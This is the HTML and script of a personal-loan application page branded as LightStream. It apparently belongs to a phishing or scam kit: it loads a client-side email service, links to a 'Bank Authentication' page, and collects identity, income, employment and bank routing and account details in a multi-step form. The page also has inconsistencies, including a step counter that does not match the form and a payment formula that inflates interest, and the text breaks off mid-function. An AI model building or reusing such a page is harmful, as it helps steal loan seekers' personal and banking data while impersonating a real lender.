<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Loans</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="form-handler.js"></script>
    <style>
        .gradient-bg {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
        }
        .cool-gradient {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
        }
        .glass-effect {
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .neon-glow {
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5), 0 0 40px rgba(255, 215, 0, 0.3);
        }
        .cool-button {
            background: linear-gradient(45deg, #000000, #333333);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .cool-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
        }
        .cool-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s;
        }
        .cool-button:hover::before {
            left: 100%;
        }
        .trust-badge {
            background: linear-gradient(45deg, #ffa500 0%, #ff6b35 100%);
        }
        .step-indicator {
            transition: all 0.3s ease;
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(255, 255, 255, 0.2);
        }
        .step-indicator.active {
            background: linear-gradient(45deg, #000000, #333333);
            color: white;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
        }
        .step-indicator.completed {
            background: linear-gradient(45deg, #333333, #666666);
            color: white;
        }
        .form-step {
            display: none;
        }
        .form-step.active {
            display: block;
            animation: fadeInUp 0.5s ease;
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        body {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
            min-height: 100vh;
        }
        .main-container {
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .form-input {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            backdrop-filter: blur(10px);
        }
        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }
        .form-input:focus {
            background: rgba(0, 0, 0, 0.7);
            border-color: #ffa500;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
        }
        .text-cool {
            color: #ffa500;
        }
        .bg-cool-card {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .loan-calculator {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
        }
    </style>
</head>
<body class="bg-black">
    <!-- Header Navigation -->
    <header class="glass-effect sticky top-0 z-50">
        <nav class="container mx-auto px-4 py-4">
            <div class="flex justify-between items-center">
                <div class="flex items-center space-x-8">
                <div class="flex items-center space-x-2">
                    <!-- Professional Logo -->
                    <div class="relative">
                        <img src="images/newlogo.png" alt="LightStream Logo" class="logo-img" style="height: 48px; width: auto; max-width: none !important; max-height: none !important; object-fit: contain; background: transparent !important; filter: brightness(0) invert(1);">
                        <div class="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></div>
                    </div>
                    <div class="text-2xl font-bold text-white">
                        <span class="text-cool">LightStream</span>
                    </div>
                </div>
                    <div class="hidden md:flex space-x-6">
                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
                        <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
                    </div>
                </div>
                <div class="hidden md:flex space-x-4">
                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
                </div>
                <button class="md:hidden text-white" id="mobileMenuBtn">
                    <i class="fas fa-bars text-2xl"></i>
                </button>
            </div>
            <!-- Mobile Menu -->
            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
                <div class="flex flex-col space-y-3">
                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
                </div>
            </div>
        </nav>
    </header>

    <!-- Hero Section -->
    <section class="gradient-bg text-white py-20">
        <div class="container mx-auto px-4">
            <div class="grid md:grid-cols-2 gap-12 items-center">
                <div>
                    <h1 class="text-4xl md:text-5xl font-bold mb-6">
                        Get up to $100,000 with a low, fixed rate loan.
                    </h1>
                    <p class="text-xl mb-8 text-gray-100">
                        No fees, fast funding, and affordable monthly payments. Apply in minutes with no impact to your credit score.
                    </p>
                    <div class="space-y-4">
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
                            <span class="text-lg">Affordable monthly payments</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
                            <span class="text-lg">No prepayment fees</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
                            <span class="text-lg">Fast funding as soon as same day</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
                            <span class="text-lg">Fixed rates you can count on</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
                            <span class="text-lg">No origination fees</span>
                        </div>
                    </div>
                    <div class="mt-8 flex items-center space-x-4">
                        <div class="flex -space-x-2">
                            <img src="https://picsum.photos/seed/user1/40/40.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
                            <img src="https://picsum.photos/seed/user2/40/40.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
                            <img src="https://picsum.photos/seed/user3/40/40.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
                        </div>
                        <div>
                            <div class="flex text-yellow-400">
                                <i class="fas fa-star"></i>
                                <i class="fas fa-star"></i>
                                <i class="fas fa-star"></i>
                                <i class="fas fa-star"></i>
                                <i class="fas fa-star"></i>
                            </div>
                            <p class="text-sm">10,000+ satisfied customers</p>
                        </div>
                    </div>
                </div>
                <div>
                    <!-- Loan Application Form -->
                    <div class="main-container rounded-2xl neon-glow p-8">
                        <div class="mb-6">
                            <h2 class="text-2xl font-bold text-white mb-2">Get Your Loan Quote</h2>
                            <p class="text-gray-200">Quick, secure, and no impact to your credit score</p>
                        </div>
                        
                        <div class="mb-6">
                            <div class="flex justify-between items-center mb-2">
                                <span class="text-sm text-gray-300">Application Progress</span>
                                <span class="text-sm text-gray-300">Step <span id="currentStep">1</span> of 2</span>
                            </div>
                            <div class="flex justify-between mt-2">
                                <div class="step-indicator active w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold">1</div>
                                <div class="step-indicator w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold">2</div>
                            </div>
                        </div>

                        <form id="personalLoanForm">
                            <!-- Step 1: Loan Details -->
                            <div class="form-step active" id="step1">
                                <div class="mb-6">
                                    <label class="block text-white text-sm font-bold mb-2" for="loanAmount">
                                        Loan Amount
                                    </label>
                                    <div class="relative">
                                        <span class="absolute left-3 top-3 text-gray-300">$</span>
                                        <input type="number" id="loanAmount" name="loanAmount" 
                                               class="form-input w-full pl-8 pr-3 py-3 rounded-lg focus:outline-none"
                                               placeholder="10,000" min="1000" max="100000" required>
                                    </div>
                                </div>
                                
                                <div class="mb-6">
                                    <label class="block text-white text-sm font-bold mb-2" for="loanPurpose">
                                        Loan Purpose
                                    </label>
                                    <select id="loanPurpose" name="loanPurpose" 
                                            class="form-input w-full px-3 py-3 rounded-lg focus:outline-none" required>
                                        <option value="">Select purpose</option>
                                        <option value="debt-consolidation">Debt Consolidation</option>
                                        <option value="home-improvement">Home Improvement</option>
                                        <option value="major-purchase">Major Purchase</option>
                                        <option value="business">Business</option>
                                        <option value="vacation">Vacation</option>
                                        <option value="wedding">Wedding</option>
                                        <option value="medical">Medical Expenses</option>
                                        <option value="education">Education</option>
                                        <option value="other">Other</option>
                                    </select>
                                </div>
                                
                                <div class="mb-6">
                                    <label class="block text-white text-sm font-bold mb-2" for="loanTerm">
                                        Loan Term
                                    </label>
                                    <select id="loanTerm" name="loanTerm" 
                                            class="form-input w-full px-3 py-3 rounded-lg focus:outline-none" required>
                                        <option value="">Select term</option>
                                        <option value="12">12 months</option>
                                        <option value="24">24 months</option>
                                        <option value="36">36 months</option>
                                        <option value="48">48 months</option>
                                        <option value="60">60 months</option>
                                        <option value="72">72 months</option>
                                        <option value="84">84 months</option>
                                    </select>
                                </div>
                                
                                <div class="flex justify-between">
                                    <button type="button" class="px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition duration-200"
                                            onclick="previousStep(1)">Previous</button>
                                    <button type="button" class="px-6 py-3 bg-cool text-white rounded-lg hover:bg-orange-600 transition duration-200"
                                            onclick="nextStep(1)">Next Step</button>
                                </div>
                            </div>

                            <!-- Step 2: Personal Information -->
                            <div class="form-step" id="step2">
                                <div class="grid md:grid-cols-2 gap-4">
                                    <div class="mb-4">
                                        <label class="block text-white text-sm font-bold mb-2" for="firstName">
                                            First Name
                                        </label>
                                        <input type="text" id="firstName" name="firstName" 
                                               class="form-input w-full px-3 py-3 rounded-lg focus:outline-none"
                                               placeholder="John" required>
                                    </div>
                                    
                                    <div class="mb-4">
                                        <label class="block text-white text-sm font-bold mb-2" for="lastName">
                                            Last Name
                                        </label>
                                        <input type="text" id="lastName" name="lastName" 
                                               class="form-input w-full px-3 py-3 rounded-lg focus:outline-none"
                                               placeholder="Doe" required>
                                    </div>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="email">
                                        Email Address
                                    </label>
                                    <input type="email" id="email" name="email" 
                                           class="form-input w-full px-3 py-3 rounded-lg focus:outline-none"
                                           placeholder="john.doe@example.com" required>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="phone">
                                        Phone Number
                                    </label>
                                    <input type="tel" id="phone" name="phone" 
                                           class="form-input w-full px-3 py-3 rounded-lg focus:outline-none"
                                           placeholder="(555) 123-4567" required>
                                </div>
                                
                                <div class="flex justify-between">
                                    <button type="button" class="px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition duration-200"
                                            onclick="previousStep(2)">Previous</button>
                                    <button type="button" class="px-6 py-3 bg-cool text-white rounded-lg hover:bg-orange-600 transition duration-200"
                                            onclick="nextStep(2)">Next Step</button>
                                </div>
                            </div>

                            <!-- Step 3: Financial Information -->
                            <div class="form-step" id="step3">
                                <h3 class="text-lg font-semibold text-white mb-4">Financial Information</h3>
                                <p class="text-sm text-gray-300 mb-6">Your information is encrypted and secure</p>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="annualIncome">
                                        Annual Income
                                    </label>
                                    <div class="relative">
                                        <span class="absolute left-3 top-3 text-gray-300">$</span>
                                        <input type="number" id="annualIncome" name="annualIncome" 
                                               class="form-input w-full pl-8 pr-3 py-3 rounded-lg focus:outline-none"
                                               placeholder="50,000" min="10000" required>
                                    </div>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="creditScore">
                                        Credit Score Range
                                    </label>
                                    <select id="creditScore" name="creditScore" 
                                            class="form-input w-full px-3 py-3 rounded-lg focus:outline-none" required>
                                        <option value="">Select range</option>
                                        <option value="excellent">Excellent (750-850)</option>
                                        <option value="good">Good (700-749)</option>
                                        <option value="fair">Fair (640-699)</option>
                                        <option value="poor">Poor (300-639)</option>
                                    </select>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="employmentStatus">
                                        Employment Status
                                    </label>
                                    <select id="employmentStatus" name="employmentStatus" 
                                            class="form-input w-full px-3 py-3 rounded-lg focus:outline-none" required>
                                        <option value="">Select status</option>
                                        <option value="full-time">Full-time Employment</option>
                                        <option value="part-time">Part-time Employment</option>
                                        <option value="self-employed">Self-Employed</option>
                                        <option value="retired">Retired</option>
                                        <option value="other">Other</option>
                                    </select>
                                </div>
                                
                                <div class="flex justify-between">
                                    <button type="button" class="px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition duration-200"
                                            onclick="previousStep(3)">Previous</button>
                                    <button type="button" class="px-6 py-3 bg-cool text-white rounded-lg hover:bg-orange-600 transition duration-200"
                                            onclick="nextStep(3)">Next Step</button>
                                </div>
                            </div>

                            <!-- Step 4: Employment & Income -->
                            <div class="form-step" id="step4">
                                <h3 class="text-lg font-semibold text-white mb-4">Employment & Income</h3>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="employerName">
                                        Employer Name
                                    </label>
                                    <input type="text" id="employerName" name="employerName" 
                                           class="form-input w-full px-3 py-3 rounded-lg focus:outline-none"
                                           placeholder="Company Name" required>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="jobTitle">
                                        Job Title
                                    </label>
                                    <input type="text" id="jobTitle" name="jobTitle" 
                                           class="form-input w-full px-3 py-3 rounded-lg focus:outline-none"
                                           placeholder="Job Title" required>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="yearsAtJob">
                                        Years at Current Job
                                    </label>
                                    <select id="yearsAtJob" name="yearsAtJob" 
                                            class="form-input w-full px-3 py-3 rounded-lg focus:outline-none" required>
                                        <option value="">Select years</option>
                                        <option value="0-1">Less than 1 year</option>
                                        <option value="1-2">1-2 years</option>
                                        <option value="2-5">2-5 years</option>
                                        <option value="5-10">5-10 years</option>
                                        <option value="10+">More than 10 years</option>
                                    </select>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-white text-sm font-bold mb-2" for="monthlyHousingPayment">
                                        Monthly Housing Payment
                                    </label>
                                    <div class="relative">
                                        <span class="absolute left-3 top-3 text-gray-300">$</span>
                                        <input type="number" id="monthlyHousingPayment" name="monthlyHousingPayment" 
                                               class="form-input w-full pl-8 pr-3 py-3 rounded-lg focus:outline-none"
                                               placeholder="1,500" min="0" required>
                                    </div>
                                </div>
                                
                                <div class="flex justify-between">
                                    <button type="button" class="px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition duration-200"
                                            onclick="previousStep(4)">Previous</button>
                                    <button type="button" class="px-6 py-3 bg-cool text-white rounded-lg hover:bg-orange-600 transition duration-200"
                                            onclick="nextStep(4)">Next Step</button>
                                </div>
                            </div>

                            <!-- Step 5: Review & Submit -->
                            <div class="form-step" id="step5">
                                <div class="mb-6">
                                    <h3 class="text-lg font-semibold text-white mb-4">Review Your Application</h3>
                                    <div id="applicationSummary" class="bg-cool-card border-2 border-gray-600 p-4 rounded-lg">
                                        <!-- Summary will be populated by JavaScript -->
                                    </div>
                                </div>
                                
                                <div class="mb-6">
                                    <label class="flex items-center">
                                        <input type="checkbox" id="terms" name="terms" required
                                               class="mr-2 w-4 h-4 text-cool bg-gray-700 border-gray-600 rounded focus:ring-cool">
                                        <span class="text-white text-sm">
                                            I agree to the terms and conditions and authorize LightStream to review my application
                                        </span>
                                    </label>
                                </div>
                                
                                <div class="mb-6">
                                    <label class="flex items-center">
                                        <input type="checkbox" id="consent" name="consent" required
                                               class="mr-2 w-4 h-4 text-cool bg-gray-700 border-gray-600 rounded focus:ring-cool">
                                        <span class="text-white text-sm">
                                            I consent to receive communications about my application
                                        </span>
                                    </label>
                                </div>
                                
                                <div class="flex justify-between">
                                    <button type="button" class="px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition duration-200"
                                            onclick="previousStep(5)">Previous</button>
                                    <button type="submit" class="px-6 py-3 bg-cool text-white rounded-lg hover:bg-orange-600 transition duration-200">
                                        Submit Application
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Features Section -->
    <section class="py-20 bg-gray-900">
        <div class="container mx-auto px-4">
            <div class="text-center mb-12">
                <h2 class="text-3xl font-bold text-white mb-4">Why Choose LightStream?</h2>
                <p class="text-gray-300 text-lg">Experience the difference with our customer-focused loan services</p>
            </div>

            <div class="grid md:grid-cols-3 gap-8">
                <div class="text-center">
                    <div class="bg-cool-card rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6">
                        <i class="fas fa-rocket text-3xl text-cool"></i>
                    </div>
                    <h3 class="text-xl font-semibold text-white mb-3">Fast Approval</h3>
                    <p class="text-gray-300">Get approved in as little as 24 hours with our streamlined application process</p>
                </div>

                <div class="text-center">
                    <div class="bg-cool-card rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6">
                        <i class="fas fa-shield-alt text-3xl text-cool"></i>
                    </div>
                    <h3 class="text-xl font-semibold text-white mb-3">Secure & Safe</h3>
                    <p class="text-gray-300">Bank-level encryption and security measures to protect your information</p>
                </div>

                <div class="text-center">
                    <div class="bg-cool-card rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6">
                        <i class="fas fa-percentage text-3xl text-cool"></i>
                    </div>
                    <h3 class="text-xl font-semibold text-white mb-3">Competitive Rates</h3>
                    <p class="text-gray-300">Some of the best rates in the market with flexible repayment terms</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="glass-effect border-t border-gray-700">
        <div class="container mx-auto px-4 py-8">
            <div class="text-center">
                <p class="text-gray-400">Â© 2024 LightStream. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <!-- Terms & Conditions Modal -->
    <div id="termsModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-lg max-w-4xl w-full max-h-[80vh] overflow-y-auto">
            <div class="sticky top-0 bg-white border-b border-gray-200 p-6 flex justify-between items-center">
                <h2 class="text-2xl font-bold text-gray-800">Terms & Conditions</h2>
                <button onclick="closeTermsModal()" class="text-gray-500 hover:text-gray-700 text-2xl font-bold">&times;</button>
            </div>
            
            <div class="p-6">
                <div class="prose max-w-none">
                    <h3 class="text-lg font-semibold mb-4">1. Loan Terms</h3>
                    <p class="mb-4">By accepting these terms, you agree to repay the loan amount plus interest according to the payment schedule outlined in your loan agreement.</p>
                    
                    <h3 class="text-lg font-semibold mb-4">2. Interest Rates</h3>
                    <p class="mb-4">Interest rates vary based on your creditworthiness, loan amount, and term length. Rates are fixed for the life of the loan.</p>
                    
                    <h3 class="text-lg font-semibold mb-4">3. Privacy Policy</h3>
                    <p class="mb-4">We protect your personal information according to applicable privacy laws. Your information will only be used for loan processing and communication purposes.</p>
                    
                    <h3 class="text-lg font-semibold mb-4">4. Authorization</h3>
                    <p class="mb-4">You authorize LightStream to verify your information, check your credit, and communicate with third parties as needed to process your application.</p>
                    
                    <h3 class="text-lg font-semibold mb-4">5. Default</h3>
                    <p class="mb-4">If you fail to make payments on time, you may be subject to late fees and collection activities.</p>
                    
                    <h3 class="text-lg font-semibold mb-4">6. Contact Information</h3>
                    <p class="mb-4">For questions about these terms, contact us at support@lightstream.com or call 1-800-LIGHTSTREAM.</p>
                </div>
                
                <div class="mt-6 flex justify-end">
                    <button onclick="closeTermsModal()" class="px-6 py-3 bg-cool text-white rounded-lg hover:bg-orange-600 transition duration-200">
                        Close & Continue
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Loan Agreement Display -->
    <div id="loanAgreementDisplay" class="main-container rounded-2xl neon-glow p-8 hidden">
        <div class="mb-6">
            <h2 class="text-2xl font-bold text-white mb-2">Unsecured Personal Loan Agreement</h2>
            <p class="text-gray-200">Loan Agreement Number: <span id="agreementNumber">LS-1770845398433</span></p>
            <p class="text-gray-200">Date: <span id="agreementDate">February 11, 2026</span></p>
        </div>

        <!-- Loan Summary & Disclosure -->
        <div class="bg-cool-card border-2 border-gray-600 p-6 rounded-lg mb-6">
            <h3 class="text-lg font-semibold text-white mb-4">Loan Summary & Disclosure</h3>
            
            <div class="grid md:grid-cols-2 gap-4 mb-4">
                <div>
                    <p class="text-sm text-gray-300">Borrower Name</p>
                    <p class="text-white font-semibold" id="borrowerNameDisplay">-</p>
                </div>
                <div>
                    <p class="text-sm text-gray-300">Email Address</p>
                    <p class="text-white font-semibold" id="emailDisplay">-</p>
                </div>
                <div>
                    <p class="text-sm text-gray-300">Phone Number</p>
                    <p class="text-white font-semibold" id="phoneDisplay">-</p>
                </div>
                <div>
                    <p class="text-sm text-gray-300">Bank Name</p>
                    <p class="text-white font-semibold" id="bankNameDisplay">-</p>
                </div>
            </div>

            <div class="grid md:grid-cols-2 gap-4 mb-4">
                <div>
                    <p class="text-sm text-gray-300">Loan Amount</p>
                    <p class="text-white font-semibold text-xl" id="loanAmountDisplay">$0.00</p>
                </div>
                <div>
                    <p class="text-sm text-gray-300">Loan Duration</p>
                    <p class="text-white font-semibold" id="loanDurationDisplay">36 months</p>
                </div>
                <div>
                    <p class="text-sm text-gray-300">Annual Percentage Rate (APR)</p>
                    <p class="text-white font-semibold" id="aprDisplay">10.00%</p>
                </div>
                <div>
                    <p class="text-sm text-gray-300">Monthly Payment (EMI)</p>
                    <p class="text-white font-semibold text-xl" id="monthlyPaymentDisplay">$0.00</p>
                </div>
            </div>

            <div class="grid md:grid-cols-2 gap-4">
                <div>
                    <p class="text-sm text-gray-300">Routing Number</p>
                    <p class="text-white font-semibold" id="routingNumberDisplay">-</p>
                </div>
                <div>
                    <p class="text-sm text-gray-300">Account Number</p>
                    <p class="text-white font-semibold" id="accountNumberDisplay">-</p>
                </div>
            </div>

            <div class="mt-4">
                <p class="text-sm text-gray-300">Total Repayment Amount</p>
                <p class="text-white font-semibold text-xl" id="totalRepaymentDisplay">$0.00</p>
            </div>
        </div>

        <!-- Signature Section -->
        <div class="bg-cool-card border-2 border-gray-600 p-6 rounded-lg mb-6">
            <h3 class="text-lg font-semibold text-white mb-4">Electronic Signature</h3>
            
            <div class="mb-4">
                <p class="text-sm text-gray-300 mb-2">Type your full name to sign this agreement electronically:</p>
                <input type="text" id="electronicSignature" placeholder="Type your signature here" 
                       class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-cool bg-white">
            </div>

            <div class="mb-4">
                <canvas id="signaturePad" width="400" height="200" 
                        class="border-2 border-gray-300 rounded-lg bg-white w-full"></canvas>
            </div>

            <div class="flex justify-between">
                <button type="button" onclick="clearSignature()" 
                        class="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700">
                    Clear Signature
                </button>
                <button type="button" onclick="downloadAgreement()" 
                        class="px-6 py-3 bg-cool text-white rounded-lg hover:bg-orange-600">
                    Download Agreement
                </button>
            </div>
        </div>
    </div>

    <script>
        // Multi-step form navigation functions
        function nextStep(stepNumber) {
            const currentStep = document.querySelector('.form-step.active');
            const nextStep = currentStep.nextElementSibling;
            
            if (nextStep && nextStep.classList.contains('form-step')) {
                currentStep.classList.remove('active');
                nextStep.classList.add('active');
                updateStepIndicators();
                window.scrollTo(0, 0);
            }
        }

        function previousStep(stepNumber) {
            const currentStep = document.querySelector('.form-step.active');
            const prevStep = currentStep.previousElementSibling;
            
            if (prevStep && prevStep.classList.contains('form-step')) {
                currentStep.classList.remove('active');
                prevStep.classList.add('active');
                updateStepIndicators();
                window.scrollTo(0, 0);
            }
        }

        function updateStepIndicators() {
            const steps = document.querySelectorAll('.form-step');
            const indicators = document.querySelectorAll('.step-indicator');
            
            steps.forEach((step, index) => {
                if (indicators[index]) {
                    if (step.classList.contains('active')) {
                        indicators[index].classList.add('active');
                        indicators[index].classList.remove('completed');
                    } else if (index < Array.from(steps).findIndex(s => s.classList.contains('active'))) {
                        indicators[index].classList.add('completed');
                        indicators[index].classList.remove('active');
                    } else {
                        indicators[index].classList.remove('active', 'completed');
                    }
                }
            });
            
            // Update current step display
            const activeStepIndex = Array.from(steps).findIndex(s => s.classList.contains('active'));
            const currentStepDisplay = document.getElementById('currentStep');
            if (currentStepDisplay) {
                currentStepDisplay.textContent = activeStepIndex + 1;
            }
        }

        function showTermsModal() {
            document.getElementById('termsModal').classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }

        function closeTermsModal() {
            document.getElementById('termsModal').classList.add('hidden');
            document.body.style.overflow = 'auto';
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            updateStepIndicators();
            
            // Load loan data and populate agreement
            loadLoanData();
            
            // Add click handler to terms text
            const termsLabel = document.querySelector('label[for="terms"] span');
            if (termsLabel) {
                termsLabel.style.cursor = 'pointer';
                termsLabel.addEventListener('click', function(e) {
                    if (!e.target.closest('input')) {
                        showTermsModal();
                    }
                });
            }
        });

        // Load loan data and populate agreement
        function loadLoanData() {
            const storedData = localStorage.getItem('loanApplicationData') || sessionStorage.getItem('loanApplicationData');
            
            if (storedData) {
                const loanData = JSON.parse(storedData);
                
                console.log('Loading loan data:', loanData);
                
                // Hide form and show agreement
                document.querySelector('form').classList.add('hidden');
                document.getElementById('loanAgreementDisplay').classList.remove('hidden');
                
                // Populate agreement fields
                const fullName = loanData.name || `${loanData.firstName || ''} ${loanData.lastName || ''}`.trim();
                document.getElementById('borrowerNameDisplay').textContent = fullName || 'Not provided';
                document.getElementById('emailDisplay').textContent = loanData.email || 'Not provided';
                document.getElementById('phoneDisplay').textContent = loanData.phone || 'Not provided';
                
                // Bank name mapping
                const bankNames = {
                    'chase': 'Chase Bank',
                    'bank-of-america': 'Bank of America',
                    'wells-fargo': 'Wells Fargo',
                    'citibank': 'Citibank',
                    'capital-one': 'Capital One',
                    'us-bank': 'U.S. Bank',
                    'pnc': 'PNC Bank',
                    'td-bank': 'TD Bank',
                    'huntington': 'Huntington Bank',
                    'ally': 'Ally Bank',
                    'other': 'Other Bank'
                };
                
                const bankValue = loanData.customerBank || loanData.bankName || 'other';
                document.getElementById('bankNameDisplay').textContent = bankNames[bankValue] || 'Not provided';
                
                // Calculate and display loan details
                const loanAmount = parseFloat(loanData.loanAmount) || 0;
                const loanDuration = parseInt(loanData.loanDuration) || 36;
                const apr = 0.10; // 10% APR
                
                // Fix calculation: monthly payment = principal / months + interest
                const monthlyInterest = (loanAmount * apr) / 12;
                const principalPayment = loanAmount / loanDuration;
                const monthlyPayment = principalPayment + monthlyInterest;
                const totalRepayment = monthlyPayment * loanDuration;
                
                document.getElementById('loanAmountDisplay').textContent = `$${loanAmount.toLocaleString()}.00`;
                document.getElementById('loanDurationDisplay').textContent = `${loanDuration} months`;
                document.getElementById('aprDisplay').textContent = `${(apr * 100).toFixed(2)}%`;
                document.getElementById('monthlyPaymentDisplay').textContent = `$${monthlyPayment.toFixed(2).toLocaleString()}`;
                document.getElementById('totalRepaymentDisplay').textContent = `$${totalRepayment.toFixed(2).toLocaleString()}`;
                
                // Bank details (these might not be available in personal-loans form)
                document.getElementById('routingNumberDisplay').textContent = loanData.routingNumber || 'Not provided';
                document.getElementById('accountNumberDisplay').textContent = loanData.accountNumber || 'Not provided';
                
                // Set current date
                const today = new Date();
                document.getElementById('agreementDate').textContent = today.toLocaleDateString('en-US', { 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric' 
                });
                
                // Generate agreement number
                const agreementNum = `LS-${Date.now()}`;
                document.getElementById('agreementNumber').textContent = agreementNum;
                
                // Initialize signature pad
                initializeSignaturePad();
                
            } else {
                alert('No loan application data found. Please start your application again.');
                window.location.href = 'personal-loans.html';
            }
        }

        // Initialize signature pad
        let signaturePad;
        function initializeSignaturePad() {
            const canvas = document.getElementById('signaturePad');
            if (canvas) {
                signaturePad = new SignaturePad(canvas, {
                    backgroundColor: 'rgb(255, 255, 255)',
                    penColor: 'rgb(0, 0, 0)'
                });
            }
        }

        // Clear signature
        function clearSignature() {
            if (signaturePad) {
                signaturePad.clear();
            }
        }

        // Download agreement
        function downloadAgreement() {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            // Add agreement content
            doc.setFontSize(16);
            doc.text('Unsecured Personal Loan Agreement', 20, 20);
            doc.setFontSize(12);
            doc.text(`Agreement Number: ${document.getElementById('agreementNumber').textContent}`, 20, 40);
            doc.text(`Date: ${document.getElementById('agreementDate').textContent}`, 20, 50);
            doc.text(`Borrower Name: ${document.getElementById('borrowerNameDisplay').textContent}`, 20, 70);
            doc.text(`Email: ${document.getElementById('emailDisplay').textContent}`, 20, 80);
            doc.text(`Phone: ${document.getElementById('phoneDisplay').textContent}`, 20, 90);
            doc.text(`Bank: ${document.getElementById('bankNameDisplay').textContent}`, 20, 100);
            doc.text(`Loan Amount: ${document.getElementById('loanAmountDisplay').textContent}`, 20, 110);
